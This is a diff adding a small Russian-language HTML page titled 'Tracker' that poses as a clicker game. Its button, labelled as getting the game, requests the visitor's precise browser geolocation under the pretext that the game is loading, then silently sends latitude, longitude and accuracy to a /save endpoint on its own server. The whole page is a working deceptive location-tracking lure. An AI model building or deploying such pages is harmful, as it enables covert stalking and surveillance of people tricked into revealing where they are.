@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Tracker</title>
+<style>
+  body { font-family: sans-serif; padding: 20px; background:#111; color:#eee; text-align:center; }
+  button { padding:15px 30px; font-size:18px; background:#4CAF50; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px; }
+  #status { margin-top:20px; font-size:18px; }
+  h2 { color:#4CAF50; }
+</style>
+</head>
+<body>
+  <h2>Игра кликер</h2>
+  <button onclick="getLocation()">Получить Игру</button>
+  <div id="status"></div>
+
+<script>
+function getLocation() {
+  const s = document.getElementById('status');
+  if (!navigator.geolocation) { 
+    s.innerText = "❌ Игра не поддерживается включите все настройки"; 
+    return; 
+  }
+  s.innerText = "⏳ подождите загрузка игры.....";
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
+      const acc = Math.round(pos.coords.accuracy);
+      s.innerHTML = `Готово!<br><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#4CAF50;">Открыть игру</a>`;
+      fetch(`/save?lat=${lat}&lon=${lon}&acc=${acc}`);
+    },
+    err => { 
+      s.innerText = "❌ Ошибка: " + err.message + "\n\nРазреши доступ в настройках браузера!"; 
+    }
+  );
+}
+</script>
+</body>
+</html>
